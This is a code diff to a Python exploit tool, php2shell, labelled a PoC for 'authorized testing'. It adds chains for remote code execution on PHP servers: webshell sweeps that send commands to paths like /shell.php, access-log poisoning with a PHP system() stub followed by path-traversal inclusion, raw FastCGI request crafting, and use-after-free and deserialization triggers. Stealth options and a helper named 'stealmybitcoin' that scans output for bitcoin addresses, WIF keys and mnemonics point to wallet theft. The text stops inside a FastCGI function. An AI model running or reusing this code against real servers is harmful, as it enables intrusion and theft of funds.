@@ -2,15 +2,21 @@
 """
 php2shell — Hybrid PHP upload PoC (authorized testing).
 
-Layer 1: PHP core CVE chain (109618/109619/115560, Auto-LFI discovery, FPM two-step, timing).
+Layer 1: PHP core CVE chain (109618/109619/115560/129474, Auto-LFI, FPM two-step, timing).
 Layer 2: Application-level upload handler discovery + shell verification.
 """
 
 from __future__ import annotations
 
 import argparse
+import http.client
 import json
+import os
 import random
+import socket
+import ssl
+import struct
+import subprocess
 import re
 import sys
 import threading
@@ -61,7 +67,13 @@ PHP_VERSION_RE = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)", re.I)
 CVE_109618 = "CVE-2026-109618"
 CVE_109619 = "CVE-2026-109619"
 CVE_115560 = "CVE-2026-115560"
-ALL_CORE_CVES: tuple[str, ...] = (CVE_109618, CVE_109619, CVE_115560)
+CVE_129474 = "CVE-2026-129474"
+ALL_CORE_CVES: tuple[str, ...] = (
+    CVE_109618,
+    CVE_109619,
+    CVE_115560,
+    CVE_129474,
+)
 
 # First fixed patch per minor branch (eness/php2shell-CVE PoC matrix).
 PHP_BRANCH_FIRST_FIXED: dict[tuple[int, int], int] = {
@@ -77,6 +89,29 @@ PHP_BRANCH_FIRST_FIXED_115560: dict[tuple[int, int], int] = {
     (8, 4): 28,
     (8, 5): 13,
 }
+# magic __call/__callStatic fatal backtrace UAF (remote path PHP 8.5+ only).
+PHP_BRANCH_FIRST_FIXED_129474: dict[tuple[int, int], int] = {
+    (8, 5): 13,
+}
+BACKTRACE_JSON_PROBE_PATHS: tuple[str, ...] = (
+    "/api/import",
+    "/import",
+    "/api/imports",
+    "/api/v1/import",
+    "/rest/V1/guest-carts/estimate-shipping-methods",
+    "/graphql",
+    "/index.php",
+    "/",
+)
+BACKTRACE_JSON_PROBE_BYTES = 640 * 1024
+RE_BACKTRACE_129474 = re.compile(
+    r"(__callStatic|__call\s*\(|"
+    r"fatal_error_backtrace|"
+    r"Stack trace:|"
+    r"#\d+\s+.*->|"
+    r"zend\.exception_ignore_args)",
+    re.I,
+)
 SERIALIZE_HANDLER_MODES: tuple[str, ...] = (
     "php",
     "php_serialize",
@@ -141,6 +176,47 @@ PHP_BRANCH_BOUNDARY_LEN: dict[str, int] = {
     "8.4": 30,
     "8.5": 32,
 }
+
+DOCROOT_SHELL_PATHS: tuple[str, ...] = (
+    "/shell.php",
+    "/x.php",
+    "/tmp/x.php",
+    "/p.php",
+    "/s.php",
+    "/cmd.php",
+    "/up.php",
+    "/fpm.php",
+    "/php2shell.php",
+)
+DOCROOT_SHELL_PARAMS: tuple[str, ...] = ("0", "cmd", "c", "command")
+
+DEFAULT_UAF_STALL_SEC = 1.15
+FASTCGI_PROBE_PORTS: tuple[int, ...] = (9000, 9001, 9002, 9003)
+FASTCGI_SCRIPT_GUESSES: tuple[str, ...] = (
+    "/var/www/html/index.php",
+    "/var/www/html/public/index.php",
+    "/srv/www/index.php",
+)
+FASTCGI_MAX_ATTEMPTS = 8
+LOG_POISON_MAX_REQUESTS = 28
+LOG_POISON_INCLUDE_PATHS: tuple[str, ...] = (
+    "/var/log/nginx/access.log",
+    "/var/log/apache2/access.log",
+    "/var/log/httpd/access_log",
+    "/usr/local/apache/logs/access_log",
+    "/opt/lampp/logs/access_log",
+    "/var/log/php-fpm/www-error.log",
+    "../../../var/log/nginx/access.log",
+    "....//....//var/log/nginx/access.log",
+)
+PEAR_PROBE_PATHS: tuple[str, ...] = (
+    "/go-pear.php",
+    "/pear.php",
+    "/PEAR.php",
+    "/usr/share/php/pear/PEAR.php",
+    "/php/pear/PEAR.php",
+    "/index.php/go-pear",
+)
 
 SESSION_SAVE_PATH_GUESSES: tuple[str, ...] = (
     "/var/lib/php/sessions/sess_{sid}",
@@ -420,6 +496,23 @@ class PoCConfig:
     core_serialize_probe: bool = True
     core_serialize_mode: str = DEFAULT_CORE_SERIALIZE_MODE
     core_serialize_transition: bool = True
+    core_docroot_sweep: bool = True
+    core_fpm_native: bool = False
+    core_fpm_native_script: Optional[str] = None
+    core_uaf_stall: bool = False
+    core_uaf_stall_sec: float = DEFAULT_UAF_STALL_SEC
+    core_fastcgi_probe: bool = False
+    core_log_poison: bool = False
+    core_pear_probe: bool = False
+    core_mismatch_chain: bool = False
+    core_modphp_leak: bool = False
+    core_modphp_leak_auto: bool = True
+    core_modphp_leak_only: bool = False
+    core_modphp_leak_retries: int = 3
+    core_modphp_output_dir: Optional[str] = None
+    core_modphp_health_url: Optional[str] = None
+    core_modphp_leak_relax: bool = True
+    core_backtrace_probe: bool = True
 
 
 @dataclass
@@ -480,6 +573,8 @@ class CoreProbeResult:
     serialize_handler_mode: str = "php"
     serialize_susceptible: bool = False
     serialize_events: list[str] = field(default_factory=list)
+    backtrace_susceptible: bool = False
+    backtrace_events: list[str] = field(default_factory=list)
 
 
 @dataclass
@@ -633,6 +728,13 @@ def classify_php_patch_status(major: int, minor: int, patch: int) -> str:
 def is_php_patched_for_cve(fp: PhpFingerprint, cve_id: str) -> bool:
     if fp.major != 8 or fp.patch <= 0:
         return False
+    if cve_id == CVE_129474:
+        if fp.minor != 5:
+            return True
+        fixed = PHP_BRANCH_FIRST_FIXED_129474.get((fp.major, fp.minor))
+        if fixed is None:
+            return True
+        return fp.patch >= fixed
     if cve_id == CVE_115560:
         fixed = PHP_BRANCH_FIRST_FIXED_115560.get((fp.major, fp.minor))
     else:
@@ -640,6 +742,10 @@ def is_php_patched_for_cve(fp: PhpFingerprint, cve_id: str) -> bool:
     if fixed is None:
         return False
     return fp.patch >= fixed
+
+
+def php_version_in_129474_remote_range(fp: PhpFingerprint) -> bool:
+    return fp.major == 8 and fp.minor == 5 and not is_php_patched_for_cve(fp, CVE_129474)
 
 
 def merge_cve_id_list(*parts: str) -> str:
@@ -698,6 +804,170 @@ def resolve_serialize_probe_modes(config: PoCConfig) -> tuple[str, ...]:
     return ("php_serialize", "php")
 
 
+def build_backtrace_json_probe_body(size_target: int = BACKTRACE_JSON_PROBE_BYTES) -> bytes:
+    """Large JSON body for 129474-style import/logging pressure (authorized testing)."""
+    size_target = max(32_768, min(size_target, 2 * 1024 * 1024))
+    chunk = "x" * 4096
+    reps = max(4, size_target // (len(chunk) + 8))
+    payload = {
+        "php2shell": "backtrace-probe",
+        "records": [chunk for _ in range(reps)],
+        "nested": {"items": [{"k": i, "v": chunk[:128]} for i in range(min(64, reps // 8))]},
+    }
+    raw = json.dumps(payload, separators=(",", ":")).encode("utf-8")
+    if len(raw) < size_target // 2 and reps < 512:
+        payload["records"].extend(chunk for _ in range(reps))
+        raw = json.dumps(payload, separators=(",", ":")).encode("utf-8")
+    return raw
+
+
+def parse_backtrace_129474_events(body: str, status_code: int) -> list[str]:
+    events: list[str] = []
+    if not body:
+        return events
+    if re.search(r"__callStatic|__call\s*\(", body):
+        events.append("backtrace:magic-method-trace")
+    if re.search(r"fatal_error_backtrace", body, re.I):
+        events.append("backtrace:fatal-backtrace-ini-leak")
+    if RE_BACKTRACE_129474.search(body):
+        events.append("backtrace:stack-trace-artifact")
+    if RE_OOM_109618.search(body) and re.search(r"Stack trace|#\d+\s", body):
+        events.append("backtrace:oom-fatal-with-trace")
+    if status_code in (500, 502, 503) and (
+        RE_OOM_109618.search(body) or RE_WORKER_FAULT.search(body)
+    ):
+        events.append("backtrace:limit-worker-path")
+    return list(dict.fromkeys(events))
+
+
+def iter_backtrace_probe_urls(target_url: str) -> list[str]:
+    origin = get_origin(target_url)
+    parsed = urlparse(target_url)
+    paths: list[str] = []
+    if parsed.path:
+        paths.append(parsed.path)
+    for path in BACKTRACE_JSON_PROBE_PATHS:
+        if path not in paths:
+            paths.append(path)
+    urls = [urljoin(origin, p) for p in paths]
+    return list(dict.fromkeys(urls))
+
+
+def probe_backtrace_129474(
+    session: requests.Session,
+    config: PoCConfig,
+    target_url: str,
+    *,
+    fp: PhpFingerprint,
+) -> tuple[list[str], list[str], Optional[str]]:
+    """
+  CVE-2026-129474 surface probe: oversized JSON POST to common import/API paths.
+  Full RCE requires app __call/__callStatic + ini fatal_error_backtraces / ignore_args.
+    """
+    if not php_version_in_129474_remote_range(fp):
+        return [], [], None
+
+    body = build_backtrace_json_probe_body()
+    headers = {
+        "Content-Type": "application/json",
+        "Accept": "application/json, text/plain, */*",
+    }
+    all_signals: list[str] = []
+    all_events: list[str] = []
+    best_url: Optional[str] = None
+
+    if not config.quiet:
+        console.print(
+            Panel(
+                f"[bold]CVE-2026-129474 backtrace probe[/]\n"
+                f"PHP {fp.version_raw or '8.5.x'} | JSON ~{len(body) // 1024} KiB | "
+                f"paths={len(iter_backtrace_probe_urls(target_url))}",
+                border_style="blue",
+            )
+        )
+
+    for url in iter_backtrace_probe_urls(target_url)[:10]:
+        apply_stealth_session(session, config, url)
+        try:
+            resp = session.post(
+                url,
+                data=body,
+                headers=headers,
+                timeout=max(config.timeout, 45.0),
+                verify=config.verify_ssl,
+                allow_redirects=True,
+            )
+        except requests.RequestException as exc:
+            all_signals.append(f"backtrace-probe:fail:{type(exc).__name__}")
+            continue
+
+        text = resp.text or ""
+        events = parse_backtrace_129474_events(text, resp.status_code)
+        if events:
+            best_url = url
+            all_signals.append(f"backtrace-probe:hit:{urlparse(url).path or '/'}")
+            for ev in events:
+                all_signals.append(f"event:{ev}")
+            all_events.extend(events)
+        elif resp.status_code in (413, 429):
+            all_signals.append("backtrace-probe:rate-or-size-limit")
+        elif RE_OOM_109618.search(text):
+            all_signals.append("backtrace-probe:oom-only")
+            all_events.append("backtrace:oom-without-trace")
+
+    all_events = list(dict.fromkeys(all_events))
+    return all_signals, all_events, best_url
+
+
+def augment_core_probe_with_backtrace(
+    session: requests.Session,
+    config: PoCConfig,
+    target_url: str,
+    result: CoreProbeResult,
+    *,
+    fp: PhpFingerprint,
+) -> CoreProbeResult:
+    if not config.core_backtrace_probe:
+        return result
+    if not php_version_in_129474_remote_range(fp):
+        return result
+
+    sigs, events, hit_url = probe_backtrace_129474(
+        session, config, target_url, fp=fp
+    )
+    if not sigs and not events:
+        return result
+
+    merged_events = list(dict.fromkeys(result.memory_events + events))
+    merged_signals = list(dict.fromkeys(result.signals + sigs))
+    result.memory_events = merged_events
+    result.signals = merged_signals
+    result.backtrace_events = [e for e in merged_events if e.startswith("backtrace:")]
+    result.backtrace_susceptible = bool(result.backtrace_events)
+    result.cve_ids = classify_cve_from_events(merged_events, fp)
+    if hit_url and not result.endpoint:
+        result.endpoint = hit_url
+
+    backtrace_hit = result.backtrace_susceptible
+    if backtrace_hit and not result.vulnerable:
+        if config.strict_cve:
+            if not is_php_patched_for_cve(fp, CVE_129474):
+                result.vulnerable = len(result.backtrace_events) >= 1
+        else:
+            result.vulnerable = fp.patch_status != "patched" or not is_php_patched_for_cve(
+                fp, CVE_129474
+            )
+
+    if result.backtrace_susceptible and not any(
+        "129474" in n for n in result.chain_notes
+    ):
+        result.chain_notes.append(
+            "CVE-2026-129474: verify zend.exception_ignore_args=0 and "
+            "fatal_error_backtraces=1 on workers; needs reachable __call/__callStatic."
+        )
+    return result
+
+
 def parse_serialize_handler_events(body: str, status_code: int) -> list[str]:
     events: list[str] = []
     if RE_SERIALIZE_115560.search(body):
@@ -723,15 +993,38 @@ def parse_serialize_handler_events(body: str, status_code: int) -> list[str]:
     return events
 
 
+def core_multipart_ini_fields(
+    config: PoCConfig,
+    *,
+    extra: Optional[dict[str, str]] = None,
+) -> Optional[dict[str, str]]:
+    """Merge CLI --form fields into core session.upload_progress multipart bodies."""
+    merged = dict(config.extra_form or {})
+    if extra:
+        merged.update(extra)
+    return merged or None
+
+
 def fetch_php_fingerprint(
     session: requests.Session,
     config: PoCConfig,
     target_url: str,
 ) -> PhpFingerprint:
     origin = get_origin(target_url)
-    candidates = [urljoin(origin, "/"), urljoin(origin, "/index.php")]
+    parsed_path = urlparse(target_url).path or "/"
+    candidates = [
+        target_url,
+        urljoin(origin, parsed_path),
+        urljoin(origin, "/php-version.php"),
+        urljoin(origin, "/"),
+        urljoin(origin, "/index.php"),
+    ]
+    seen: set[str] = set()
     best = PhpFingerprint()
     for url in candidates:
+        if url in seen:
+            continue
+        seen.add(url)
         apply_stealth_session(session, config, url)
         try:
             resp = session.get(
@@ -742,12 +1035,33 @@ def fetch_php_fingerprint(
             )
         except requests.RequestException:
             continue
+        body = resp.text or ""
+        m = re.search(r"PHP\s+(\d+\.\d+\.\d+)", body)
+        if m:
+            fp = parse_php_version_header(f"PHP/{m.group(1)}")
+            if fp.version_raw:
+                return fp
         powered = resp.headers.get("X-Powered-By") or resp.headers.get("x-powered-by") or ""
         fp = parse_php_version_header(powered)
         if fp.version_raw:
             return fp
         if not best.version_raw and powered:
             best = parse_php_version_header(powered)
+    leak_url = urljoin(origin, parsed_path if parsed_path.endswith(".php") else "/ping.php")
+    try:
+        apply_stealth_session(session, config, leak_url)
+        leak = session.request(
+            "FOO",
+            leak_url,
+            timeout=http_timeout(config),
+            verify=config.verify_ssl,
+        )
+        powered = leak.headers.get("X-Powered-By") or leak.headers.get("x-powered-by") or ""
+        fp = parse_php_version_header(powered)
+        if fp.version_raw:
+            return fp
+    except requests.RequestException:
+        pass
     return best
 
 
@@ -1424,6 +1738,120 @@ def ensure_lfi_templates_for_chain(
     return config, None
 
 
+def run_docroot_shell_sweep(
+    session: requests.Session,
+    config: PoCConfig,
+    target_url: str,
+    command: str,
+) -> CoreChainResult:
+    """After FPM file-write chains, probe common webshell paths under the docroot."""
+    cmd = command.strip() or "id"
+    origin = get_origin(target_url)
+    notes: list[str] = ["docroot-sweep: probing written shell paths"]
+    for path in DOCROOT_SHELL_PATHS:
+        url = urljoin(origin, path)
+        for param in DOCROOT_SHELL_PARAMS:
+            apply_stealth_session(session, config, url)
+            try:
+                resp = session.get(
+                    url,
+                    params={param: cmd},
+                    timeout=http_timeout(config)[1],
+                    verify=config.verify_ssl,
+                    allow_redirects=True,
+                )
+            except requests.RequestException as exc:
+                notes.append(f"sweep fail {path}?{param}=: {exc}")
+                continue
+            body = resp.text or ""
+            if resp.status_code not in (200, 500) or body.strip() in ("pong", ""):
+                continue
+            if looks_like_command_output(body, cmd):
+                out = clean_command_output(body)
+                return CoreChainResult(
+                    True,
+                    stage="docroot-shell",
+                    output=out or body[:2000],
+                    sid="",
+                    lfi_url_used=f"{url}?{param}={quote(cmd, safe='')}",
+                    notes=notes,
+                )
+            if CORE_CHAIN_MARKER in body and "<?php" not in body[:200]:
+                return CoreChainResult(
+                    True,
+                    stage="docroot-shell-marker",
+                    output=clean_command_output(body),
+                    sid="",
+                    lfi_url_used=url,
+                    notes=notes,
+                )
+    return CoreChainResult(
+        False,
+        stage="docroot-sweep",
+        error="no docroot shell answered",
+        notes=notes,
+    )
+
+
+def run_native_fpm128_exploit(
+    config: PoCConfig,
+    command: str,
+) -> Optional[CoreChainResult]:
+    """Optional subprocess driver for vendor fpm128_rce.py (full PHP-FPM chain)."""
+    script = config.core_fpm_native_script
+    if not script:
+        script = str(Path(__file__).resolve().parent / "stealmybitcoin_fpm128.py")
+    if not Path(script).is_file():
+        return None
+    env = os.environ.copy()
+    parsed = urlparse(config.target_url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    env.setdefault("URL", base)
+    env.setdefault("CMD", command.strip() or "print-flag")
+    env.setdefault("WORKERS", "4")
+    env.setdefault("ATTEMPTS", "2")
+    try:
+        proc = subprocess.run(
+            [sys.executable, script],
+            env=env,
+            capture_output=True,
+            text=True,
+            timeout=max(120, int(config.timeout) * 40),
+            cwd=str(Path(script).resolve().parent),
+        )
+    except (subprocess.TimeoutExpired, OSError) as exc:
+        return CoreChainResult(
+            False,
+            stage="fpm-native",
+            error=f"native fpm driver failed: {exc}",
+            notes=[],
+        )
+    combined = (proc.stdout or "") + "\n" + (proc.stderr or "")
+    if proc.returncode == 0:
+        for line in combined.splitlines():
+            if line.strip() and (
+                "uid=" in line or "bc1" in line or "flag" in line.lower()
+            ):
+                return CoreChainResult(
+                    True,
+                    stage="fpm-native",
+                    output=line.strip(),
+                    notes=["fpm128 subprocess OK", combined[-800:]],
+                )
+        return CoreChainResult(
+            True,
+            stage="fpm-native",
+            output=combined.strip()[-1500:],
+            notes=["fpm128 exit 0"],
+        )
+    return CoreChainResult(
+        False,
+        stage="fpm-native",
+        error=f"fpm128 exit {proc.returncode}",
+        notes=combined.strip().splitlines()[-12:],
+    )
+
+
 def run_lfi_session_chain(
     session: requests.Session,
     config: PoCConfig,
@@ -1513,6 +1941,16 @@ def looks_like_command_output(body: str, command: str) -> bool:
         body,
     ):
         return True
+    if "print-flag" in cmd or cmd.endswith("print-flag"):
+        stripped = body.strip()
+        if stripped in ("pong",) or "Expected message=ping" in body:
+            return False
+        if re.search(r"POST ping here:|php-version\.php", body, re.I):
+            return False
+        if re.search(r"bc1[a-z0-9]{20,}|flag\{|wif|mnemonic|private\s*key", body, re.I):
+            return True
+        if re.search(r"^[a-fA-F0-9]{32,}$", stripped[:128].replace("\n", "")):
+            return True
     if cmd.startswith("echo ") and cmd.split(" ", 1)[1].strip("'\"") in body:
         return not html_heavy
     return False
@@ -1569,6 +2007,7 @@ def fpm_two_step_fault_injection(
         file_padding=oom_pad,
         spray_fields=spray,
         file_body=build_chain_file_body(command, oom_pad, 0),
+        session_ini_fields=core_multipart_ini_fields(config),
     )
     _r1, e1, ms1 = post_core_multipart(
         session, config, endpoint_url, sid=sid, boundary=boundary, body=oom_body, content_type=oom_ct
@@ -1588,6 +2027,7 @@ def fpm_two_step_fault_injection(
         spray_fields=spray[: max(1, len(spray) // 2)] if spray else [],
         file_body=build_chain_file_body(command, prog_pad, 32),
         progress_value=CORE_CHAIN_MARKER,
+        session_ini_fields=core_multipart_ini_fields(config),
     )
     resp2, e2, ms2 = post_core_multipart(
         session, config, endpoint_url, sid=sid, boundary=boundary2, body=body2, content_type=ct2
@@ -1645,6 +2085,630 @@ def fpm_two_step_fault_injection(
     )
 
 
+def target_host_port(url: str) -> tuple[str, int, bool]:
+    parsed = urlparse(url)
+    host = parsed.hostname or ""
+    secure = parsed.scheme.lower() == "https"
+    if parsed.port:
+        port = parsed.port
+    else:
+        port = 443 if secure else 80
+    return host, port, secure
+
+
+def _http_client_for_url(url: str, timeout: float) -> http.client.HTTPConnection:
+    host, port, secure = target_host_port(url)
+    if secure:
+        ctx = ssl.create_default_context()
+        return http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
+    return http.client.HTTPConnection(host, port, timeout=timeout)
+
+
+def _multipart_post_path(url: str) -> str:
+    parsed = urlparse(url)
+    path = parsed.path or "/"
+    if parsed.query:
+        path = f"{path}?{parsed.query}"
+    return path
+
+
+def post_core_multipart_pinned_connection(
+    config: PoCConfig,
+    endpoint_url: str,
+    *,
+    sid: str,
+    posts: list[tuple[bytes, str, str]],
+    stall_sec: float = 0.0,
+) -> tuple[list[tuple[Optional[int], bytes, float]], list[str]]:
+    """
+    Same TCP connection: multiple POSTs (syrex1013 lab-uaf style stall between phases).
+    posts: list of (body, content_type, label)
+    """
+    notes: list[str] = []
+    results: list[tuple[Optional[int], bytes, float]] = []
+    timeout = max(8.0, float(config.timeout))
+    conn = _http_client_for_url(endpoint_url, timeout)
+    path = _multipart_post_path(endpoint_url)
+    origin = get_origin(endpoint_url)
+    try:
+        conn.connect()
+        for idx, (body, content_type, label) in enumerate(posts):
+            if idx > 0 and stall_sec > 0:
+                notes.append(f"uaf: stall {stall_sec:.2f}s before {label}")
+                time.sleep(stall_sec)
+            headers = build_browser_headers(origin + "/")
+            headers["Content-Type"] = content_type
+            headers["Cookie"] = f"PHPSESSID={sid}"
+            headers["Content-Length"] = str(len(body))
+            headers["Connection"] = "keep-alive"
+            started = time.perf_counter()
+            conn.request("POST", path, body=body, headers=headers)
+            resp = conn.getresponse()
+            raw = resp.read() or b""
+            elapsed = (time.perf_counter() - started) * 1000.0
+            results.append((resp.status, raw, elapsed))
+            notes.append(f"uaf: {label} status={resp.status} {elapsed:.0f}ms")
+    except (TimeoutError, OSError, http.client.HTTPException) as exc:
+        notes.append(f"uaf: connection fault {type(exc).__name__}: {exc}")
+    finally:
+        try:
+            conn.close()
+        except Exception:
+            pass
+    return results, notes
+
+
+def run_uaf_stall_chain(
+    session: requests.Session,
+    config: PoCConfig,
+    endpoint_url: str,
+    fp: PhpFingerprint,
+    *,
+    sid: str,
+    command: str,
+) -> CoreChainResult:
+    """109619: OOM phase + min_freq stall + upload_progress on pinned connection."""
+    notes: list[str] = ["uaf-stall: pinned two-phase POST"]
+    boundary = make_multipart_boundary(fp.branch_key)
+    spray = (
+        generate_heap_spray_fields(config.core_heap_spray_fields, fp)
+        if config.core_heap_spray
+        else []
+    )
+    oom_pad = config.optimal_oom_bytes if config.optimal_oom_bytes > 0 else (
+        5120 if config.core_aggressive_oom else max(config.core_file_padding, 2048)
+    )
+    body1, ct1 = build_upload_progress_multipart(
+        sid=sid,
+        progress_name=PHP_SESSION_UPLOAD_PROGRESS,
+        filename=f"{CORE_MARKER_PREFIX}uaf1.bin",
+        boundary=boundary,
+        file_padding=oom_pad,
+        spray_fields=spray,
+        file_body=build_chain_file_body(command, oom_pad, 0),
+        session_ini_fields=core_multipart_ini_fields(config),
+    )
+    boundary2 = make_multipart_boundary(fp.branch_key)
+    prog_pad = config.core_file_padding
+    body2, ct2 = build_upload_progress_multipart(
+        sid=sid,
+        progress_name=PHP_SESSION_UPLOAD_PROGRESS,
+        filename=f"{CORE_MARKER_PREFIX}chain.phtml",
+        boundary=boundary2,
+        file_padding=prog_pad,
+        spray_fields=spray[: max(1, len(spray) // 2)] if spray else [],
+        file_body=build_chain_file_body(command, prog_pad, 32),
+        progress_value=CORE_CHAIN_MARKER,
+        session_ini_fields=core_multipart_ini_fields(config),
+    )
+    stall = max(1.05, config.core_uaf_stall_sec)
+    results, conn_notes = post_core_multipart_pinned_connection(
+        config,
+        endpoint_url,
+        sid=sid,
+        posts=[
+            (body1, ct1, "phase1-oom"),
+            (body2, ct2, "phase2-progress"),
+        ],
+        stall_sec=stall,
+    )
+    notes.extend(conn_notes)
+    timing_ms = results[-1][2] if results else 0.0
+    for status, raw, _ms in results:
+        try:
+            body = raw.decode("utf-8", errors="replace")
+        except Exception:
+            body = ""
+        if looks_like_command_output(body, command):
+            return CoreChainResult(
+                True,
+                stage="uaf-stall",
+                output=clean_command_output(body),
+                sid=sid,
+                timing_ms=timing_ms,
+                notes=notes,
+            )
+        if CORE_CHAIN_MARKER in body and status in (200, 500):
+            out = clean_command_output(body)
+            if out:
+                return CoreChainResult(
+                    True,
+                    stage="uaf-stall-marker",
+                    output=out,
+                    sid=sid,
+                    timing_ms=timing_ms,
+                    notes=notes,
+                )
+        if re.search(r"bytes_processed|upload_progress", body, re.I):
+            notes.append("uaf-stall: upload_progress artifact in response")
+    return CoreChainResult(
+        False,
+        stage="uaf-stall",
+        error="pinned stall chain did not yield execution",
+        sid=sid,
+        timing_ms=timing_ms,
+        notes=notes,
+    )
+
+
+def build_mismatch_upload_filename(command: str) -> str:
+    """Filename-side php_serialize stub (ikow/php2shell-poc chain C hint)."""
+    marker = CORE_CHAIN_MARKER[:32]
+    inner = (
+        f'O:8:"stdClass":1:{{s:4:"cmd";s:{len(command)}:"{command}";}}'
+    )
+    return f"|{inner}|{marker}.phtml"
+
+
+def run_mismatch_deserialize_chain(
+    session: requests.Session,
+    config: PoCConfig,
+    endpoint_url: str,
+    fp: PhpFingerprint,
+    *,
+    sid: str,
+    command: str,
+) -> CoreChainResult:
+    """115560: php_serialize handler + wrapped progress + session reload."""
+    notes: list[str] = ["mismatch: php_serialize poison + trigger GET"]
+    boundary = make_multipart_boundary(fp.branch_key)
+    filename = build_mismatch_upload_filename(command)
+    pad = config.core_file_padding
+    ini = core_multipart_ini_fields(
+        config,
+        extra={"session.serialize_handler": "php_serialize"},
+    )
+    body, ct = build_upload_progress_multipart(
+        sid=sid,
+        progress_name=PHP_SESSION_UPLOAD_PROGRESS,
+        filename=filename,
+        boundary=boundary,
+        file_padding=pad,
+        file_body=build_chain_file_body(command, pad, 16),
+        progress_value=CORE_CHAIN_MARKER,
+        serialize_handler="php_serialize",
+        serialize_marker=CORE_CHAIN_MARKER,
+        session_ini_fields=ini,
+    )
+    _resp, _exc, ms = post_core_multipart(
+        session, config, endpoint_url, sid=sid, boundary=boundary, body=body, content_type=ct
+    )
+    notes.append(f"mismatch: poison POST {ms:.0f}ms")
+    apply_stealth_session(session, config, endpoint_url)
+    try:
+        trig = session.get(
+            endpoint_url,
+            params={"c": command, "cmd": command},
+            timeout=config.timeout,
+            verify=config.verify_ssl,
+            allow_redirects=True,
+        )
+    except requests.RequestException as exc:
+        return CoreChainResult(
+            False,
+            stage="mismatch-deserialize",
+            error=str(exc),
+            sid=sid,
+            notes=notes,
+        )
+    body = trig.text or ""
+    events = parse_serialize_handler_events(body, trig.status_code)
+    if events:
+        notes.extend(events[:6])
+    if looks_like_command_output(body, command):
+        return CoreChainResult(
+            True,
+            stage="mismatch-deserialize",
+            output=clean_command_output(body),
+            sid=sid,
+            timing_ms=ms,
+            notes=notes,
+        )
+    return CoreChainResult(
+        False,
+        stage="mismatch-deserialize",
+        error="deserialize trigger did not execute",
+        sid=sid,
+        timing_ms=ms,
+        notes=notes,
+    )
+
+
+def build_log_poison_lfi_templates(target_url: str) -> list[str]:
+    origin = get_origin(target_url)
+    templates: list[str] = []
+    for page in LFI_AUTO_PROBE_PAGES[:5]:
+        page_url = urljoin(origin, page)
+        for param in LFI_PARAM_WORDLIST[:12]:
+            templates.append(build_lfi_template_for_page(page_url, param))
+    return list(dict.fromkeys(templates))
+
+
+def run_log_poison_chain(
+    session: requests.Session,
+    config: PoCConfig,
+    target_url: str,
+    endpoint_url: str,
+    *,
+    sid: str,
+    command: str,
+) -> CoreChainResult:
+    """Inject PHP stub into access logs via User-Agent, then LFI log paths."""
+    notes: list[str] = ["log-poison: User-Agent + log LFI sweep"]
+    poison_tag = f"<?php @system($_GET['c']);/*{CORE_CHAIN_MARKER}*/?>"
+    headers = build_browser_headers(get_origin(target_url) + "/")
+    headers["User-Agent"] = poison_tag
+    headers["Cookie"] = f"PHPSESSID={sid}"
+    for hit_url in (endpoint_url, target_url):
+        try:
+            session.get(
+                hit_url,
+                headers=headers,
+                timeout=min(config.timeout, 15.0),
+                verify=config.verify_ssl,
+                allow_redirects=True,
+            )
+        except requests.RequestException:
+            continue
+    templates = build_log_poison_lfi_templates(target_url)
+    extra = load_lfi_url_templates(config)
+    for tmpl in extra:
+        if tmpl not in templates:
+            templates.append(tmpl)
+    tries = 0
+    for tmpl in templates[:6]:
+        if LFI_FUZZ_TOKEN not in tmpl:
+            continue
+        for log_path in LOG_POISON_INCLUDE_PATHS:
+            if tries >= LOG_POISON_MAX_REQUESTS:
+                break
+            tries += 1
+            url = tmpl.replace(LFI_FUZZ_TOKEN, quote(log_path, safe=""))
+            apply_stealth_session(session, config, url)
+            try:
+                resp = session.get(
+                    url,
+                    params={"c": command, "cmd": command},
+                    timeout=min(config.timeout, 10.0),
+                    verify=config.verify_ssl,
+                    allow_redirects=True,
+                )
+            except requests.RequestException as exc:
+                notes.append(f"log-poison fail: {exc}")
+                continue
+            body = resp.text or ""
+            if looks_like_command_output(body, command):
+                return CoreChainResult(
+                    True,
+                    stage="log-poison-lfi",
+                    output=clean_command_output(body),
+                    sid=sid,
+                    lfi_url_used=url,
+                    notes=notes,
+                )
+        if tries >= LOG_POISON_MAX_REQUESTS:
+            break
+    return CoreChainResult(
+        False,
+        stage="log-poison",
+        error="log poison LFI exhausted",
+        sid=sid,
+        notes=notes,
+    )
+
+
+def _fcgi_pack_len(length: int) -> bytes:
+    if length < 128:
+        return bytes([length])
+    return struct.pack(">I", length | 0x80000000)
+
+
+def _fcgi_name_value(name: str, value: str) -> bytes:
+    nb = name.encode("utf-8")
+    vb = value.encode("utf-8")
+    return _fcgi_pack_len(len(nb)) + nb + _fcgi_pack_len(len(vb)) + vb
+
+
+def _fcgi_record(record_type: int, request_id: int, content: bytes) -> bytes:
+    length = len(content)
+    header = struct.pack(
+        ">BBHHBB",
+        1,
+        record_type,
+        request_id,
+        length,
+        0,
+        0,
+    )
+    return header + content
+
+
+def build_fastcgi_request(
+    *,
+    script_filename: str,
+    query_string: str,
+    post_body: bytes,
+    document_root: str = "/var/www/html",
+) -> bytes:
+    params = b"".join(
+        _fcgi_name_value(k, v)
+        for k, v in (
+            ("REQUEST_METHOD", "POST"),
+            ("SCRIPT_FILENAME", script_filename),
+            ("QUERY_STRING", query_string),
+            ("DOCUMENT_ROOT", document_root),
+            ("SERVER_PROTOCOL", "HTTP/1.1"),
+            ("CONTENT_TYPE", "application/x-www-form-urlencoded"),
+            ("CONTENT_LENGTH", str(len(post_body))),
+        )
+    )
+    buf = bytearray()
+    buf.extend(_fcgi_record(1, 1, struct.pack(">HB5x", 1, 0)))  # BEGIN_REQUEST
+    buf.extend(_fcgi_record(4, 1, params))
+    buf.extend(_fcgi_record(4, 1, b""))  # PARAMS end
+    if post_body:
+        buf.extend(_fcgi_record(5, 1, post_body))
+    buf.extend(_fcgi_record(5, 1, b""))  # STDIN end
+    return bytes(buf)
+
+
+def parse_fastcgi_stdout(payload: bytes) -> bytes:
+    out = bytearray()
+    offset = 0
+    while offset + 8 <= len(payload):
+        version, rec_type, req_id, content_len, _pad1, _pad2 = struct.unpack_from(
+            ">BBHHBB", payload, offset
+        )
+        if version != 1:
+            break
+        offset += 8
+        chunk = payload[offset : offset + content_len]
+        offset += content_len
+        if rec_type == 6:
+            out.extend(chunk)
+        elif rec_type == 3:
+            break
+    return bytes(out)
+
+
+def run_fastcgi_rce_probe(
+    config: PoCConfig,
+    target_url: str,
+    command: str,
+) -> CoreChainResult:
